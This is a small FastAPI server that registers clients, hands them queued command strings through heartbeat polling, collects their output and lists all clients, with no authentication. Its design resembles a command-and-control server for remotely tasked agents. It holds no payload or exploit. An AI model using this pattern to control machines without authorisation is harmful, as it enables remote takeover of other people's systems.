import datetime
import time
import uuid

from fastapi import FastAPI, Query
from fastapi.responses import PlainTextResponse
from pydantic import BaseModel
from enum import Enum


class TaskStatus(Enum):
    ERROR = -1
    COMPLETE = 0
    PENDING = 2


class Task(BaseModel):
    uid: uuid.UUID
    command: str
    output: str
    status: TaskStatus


app = FastAPI()

active_connections: dict[uuid.UUID, float] = {}
pending_tasks: dict[uuid.UUID, list[Task]] = {}


@app.get("/register", response_class=PlainTextResponse)
async def register() -> str:
    connection_id = uuid.uuid4()

    active_connections[connection_id] = time.time()
    pending_tasks[connection_id] = []

    return str(connection_id)


@app.get("/heartbeat/{connection_id}", response_class=PlainTextResponse)
async def heartbeat(connection_id: uuid.UUID) -> str:
    active_connections[connection_id] = time.time()
    connection_tasks = pending_tasks[connection_id]
    if len(connection_tasks) > 0:
        if connection_tasks[0].status == TaskStatus.PENDING:
            task = connection_tasks.pop(0)
            return str(task)
    return ""


@app.post("/update_task/{connection_id}", response_class=PlainTextResponse)
async def update_task(connection_id: uuid.UUID, input_task: Task):
    active_connections[connection_id] = time.time()
    connection_tasks = pending_tasks[connection_id]
    connection_tasks.append(input_task)


@app.post("/add_task/{connection_id}")
async def add_task(connection_id: uuid.UUID, command: str = Query(...)):
    task = Task(uid=uuid.uuid4(), command=command, output="", status=TaskStatus.PENDING)
    pending_tasks[connection_id].insert(0, task)


@app.get("/status")
async def status() -> dict:
    info = {}
    for connection_id, contact_time in active_connections.items():
        info[str(connection_id)] = {
            "last_contact": datetime.datetime.fromtimestamp(contact_time),
            "tasks": pending_tasks[connection_id],
        }

    return info
